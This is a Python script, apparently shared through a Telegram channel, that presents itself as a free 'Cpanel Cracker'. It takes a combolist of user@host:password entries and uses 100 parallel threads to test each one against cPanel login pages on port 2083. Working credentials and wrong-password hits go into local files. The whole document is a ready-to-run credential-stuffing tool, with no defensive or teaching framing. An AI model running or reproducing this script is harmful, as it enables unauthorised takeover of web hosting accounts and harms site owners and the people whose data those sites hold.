#Coder: @simosaper11
#channel: @simosaper
#FREE TOOL !!!
#note: when you show name coder add in source this happen because script kids go sell this tools ^__^
 
import requests, os,random,ctypes,colored
import colorama
from colorama import Fore
from colorama import Fore as F, Style
from concurrent.futures import ThreadPoolExecutor
#Coder: @simosaper11
#channel: @simosaper
#FREE TOOL !!!
#note: when you show name coder add in source this happen because script kids go sell this tools ^__^
 
yellow = F.LIGHTYELLOW_EX
red = F.LIGHTRED_EX
green = F.LIGHTGREEN_EX
cyan = F.LIGHTCYAN_EX
blue = F.LIGHTBLUE_EX
sb = Style.BRIGHT
#Coder: @simosaper11
#channel: @simosaper
#FREE TOOL !!!
#note: when you show name coder add in source this happen because script kids go sell this tools ^__^
 
if not os.path.exists('@simosaper11'):
    os.mkdir('@simosaper11')

colorama.init()

head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'}
TOTAL = 0
WORK = 0
WRONG = 0
BAD = 0

#Coder: @simosaper11
#channel: @simosaper
#FREE TOOL !!!
#note: when you show name coder add in source this happen because script kids go sell this tools ^__^
 
def checker(line):
    global TOTAL
    global WORK
    global WRONG
    global BAD
       
    spl = line.split('@')
    user = spl[0]
    url = spl[1].split(':')[0]
    miniurl = url+':2083'
    url = 'https://'+url + ':2083/login/?login_only=1'
    passw = line.split(':')[1]


    
    data = f'user={user}&pass={passw}&goto_uri=%2F'
    try:
        r = requests.post(url,headers=head,data=data,allow_redirects=False).text

        result = f'URL: {miniurl}\nUSER: {user}\nPASS: {passw}\n[>] Checked By @medployboy\n\n'

        if '{"notices":[]' in r or 'security_token":"' in r:
            print(f'{Fore.LIGHTCYAN_EX}[{Fore.LIGHTMAGENTA_EX}>{Fore.LIGHTCYAN_EX}]{Fore.LIGHTGREEN_EX}[FOUND]{Fore.LIGHTWHITE_EX} {miniurl}|{user}|{passw} {Fore.LIGHTBLUE_EX}MSG: {Fore.LIGHTYELLOW_EX} VALID CPANEL ')
            WORK +=1
            TOTAL +=1
#Coder: @simosaper11
#channel: @simosaper
#FREE TOOL !!!
#note: when you show name coder add in source this happen because script kids go sell this tools ^__^
 
            save = open('@simosaper11/Work Cpanels.txt','a')
            save.write(result)
            save.close()
        if 'invalid_login' in r:
            print(f"{Fore.LIGHTCYAN_EX}[{Fore.LIGHTMAGENTA_EX}>{Fore.LIGHTCYAN_EX}]{Fore.LIGHTGREEN_EX}[FOUND]{Fore.LIGHTWHITE_EX} {miniurl}|{user}|{passw} {Fore.LIGHTBLUE_EX}MSG: {Fore.LIGHTYELLOW_EX}FOUND CPANEL BUT WRONG PASSWORD")
            WRONG +=1
            TOTAL +=1
            save = open('@simosaper11/Cpanels WrongPassword.txt','a')
            save.write(result)
            save.close()
    except:
        print(f'{Fore.LIGHTCYAN_EX}[{Fore.LIGHTMAGENTA_EX}<{Fore.LIGHTCYAN_EX}]{Fore.LIGHTRED_EX}[BAD]{Fore.LIGHTWHITE_EX} {miniurl}')
        BAD +=1
        TOTAL +=1
    ctypes.windll.kernel32.SetConsoleTitleW(f'Cpanel Cracker join now : [https://t.me/simosaper | Checked {TOTAL}\\{num} \\ WORK {WORK} \\ WrongPASS {WRONG} \\ BAD {BAD}')
#Coder: @simosaper11
#channel: @simosaper
#FREE TOOL !!!
#note: when you show name coder add in source this happen because script kids go sell this tools ^__^
 

def main():
    global num
    if os.name == 'nt':
        os.system('cls')
    else:os.system('clear')
    os.system('mode con:cols=130 lines=30')
    ctypes.windll.kernel32.SetConsoleTitleW('Cpanel Cracker : Coder @simosaper11')
    
    
#Coder: @simosaper11
#channel: @simosaper
#FREE TOOL !!!
#note: when you show name coder add in source this happen because script kids go sell this tools ^__^
     
    

    print(f"""{F.LIGHTCYAN_EX}
         _
   _____(_)___ ___  ____  _________ _____  ___  _____
  / ___/ / __ `__ \/ __ \/ ___/ __ `/ __ \/ _ \/ ___/
 (__  ) / / / / / / /_/ (__  ) /_/ / /_/ /  __/ /
/____/_/_/ /_/ /_/\____/____/\__,_/ .___/\___/_/
                                 /_/                 {F.LIGHTCYAN_EX}
                                                 {F.LIGHTYELLOW_EX} [ CPANEL CRACKER ]
                                                 {F.LIGHTYELLOW_EX}[  FREE VERSION :0 ]
                                         {F.LIGHTYELLOW_EX}TELEGRAM FOR MORE TOOLS:{F.LIGHTWHITE_EX} https://t.me/simosaper
    """)
    lista = input('Enter Combolist: ')
    if os.name == 'nt':
        os.system('cls')
    else:os.system('clear')
    with open(lista,'r') as f:
        lines = f.read().splitlines()

#Coder: @simosaper11
#channel: @simosaper
#FREE TOOL !!!
#note: when you show name coder add in source this happen because script kids go sell this tools ^__^
 
        
        num = len(lines)
    with ThreadPoolExecutor(max_workers=100) as p:
        p.map(checker,lines)
main()
